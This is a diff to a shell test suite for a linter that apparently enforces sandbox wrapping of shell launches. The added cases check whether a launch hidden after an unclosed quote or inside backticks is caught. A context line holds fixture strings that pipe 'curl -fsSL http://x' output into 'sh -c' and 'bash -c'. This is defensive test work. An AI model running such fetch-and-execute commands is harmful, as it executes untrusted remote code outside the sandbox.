@@ -196,6 +196,15 @@ if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then bad 'quoted parenthesis hides
 # shellcheck disable=SC2016
 printf '%s\n' "$WRAP -- bash x" "for c in \\" "    'sh -c \"\$(curl -fsSL http://x)\"' \\" "    'bash -c \"\`curl -fsSL http://x\`\"'; do :; done" > "$SHELL_FIXTURE"
 if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then ok 'single-quoted payload text accepted'; else bad 'single-quoted payload text rejected'; fi
+# An unclosed quote leaves the rest of the line as code, and a backtick inside
+# double quotes opens code again.
+# shellcheck disable=SC2016
+for body in "echo \$'\\'' ; bash \"\$T\"" "'; bash \"\$T\"" 'echo "`bash $T`"'; do
+    printf '# sandbox-run.sh marker is not a wrapper\n%s\n' "$body" > "$SHELL_FIXTURE"
+    if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then
+        bad "launch after an unclosed quote or inside backticks accepted: $body"
+    else ok "launch after an unclosed quote or inside backticks rejected: $body"; fi
+done
 # An apostrophe inside double quotes or escaped does not open a single-quoted span.
 # shellcheck disable=SC2016,SC1003
 for launch in 'echo "can'\''t"; bash "$TARGET"; echo '\''done'\''' 'echo can\'\''t; bash "$TARGET"; echo '\''done'\'''; do
